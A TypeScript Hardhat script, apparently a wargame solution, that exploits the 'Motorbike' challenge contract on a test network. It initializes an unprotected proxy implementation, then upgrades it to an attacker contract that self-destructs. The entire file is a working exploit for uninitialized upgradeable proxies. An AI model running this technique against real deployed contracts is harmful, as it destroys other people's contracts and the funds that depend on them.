import { ethers } from 'hardhat'
import { ExploitMotorbike } from '../types/typechain/ExploitMotorbike'
import { IEngine } from '../types/typechain/IEngine'
import 'dotenv/config'

async function main() {
  const motorbikeAddr = '0xb31e7Ca2ffa42C81eA9DB728eFDE32aDF16cDCB8'

  const engineAddr =
    '0x' +
    (
      await ethers.provider.getStorageAt(
        motorbikeAddr,
        // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
        '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
      )
    ).substring(26)

  console.log('Engine Address', engineAddr)

  const aWallet = new ethers.Wallet(
    process.env.DEV_WALLET as string,
    ethers.provider
  )

  const faultyFac = await ethers.getContractFactory('ExploitMotorbike', aWallet)
  const faultyEngine = (await faultyFac.deploy()) as ExploitMotorbike

  const engine = (await ethers.getContractAt(
    'IEngine',
    engineAddr,
    aWallet
  )) as IEngine

  const calldata = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes('blowUp()'))
    .substring(0, 10)

  console.log('Deploying contract...')
  await faultyEngine.deployed()
  console.log(faultyEngine.address)
  console.log('Contract deployed, swapping out engine contract...')

  // Gaining access to upgrade contract
  const initTX = await engine.initialize()
  console.log('Waiting for initTX...')
  await initTX.wait()

  // Exploiding delegatecall in fc; upgrades and calls selfdestruct()
  const upgradeTX = await engine.upgradeToAndCall(
    faultyEngine.address,
    calldata
  )
  console.log('Waiting for upgradeTX...')
  await upgradeTX.wait()

  console.log('https://rinkeby.etherscan.io/tx/' + upgradeTX.hash)
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
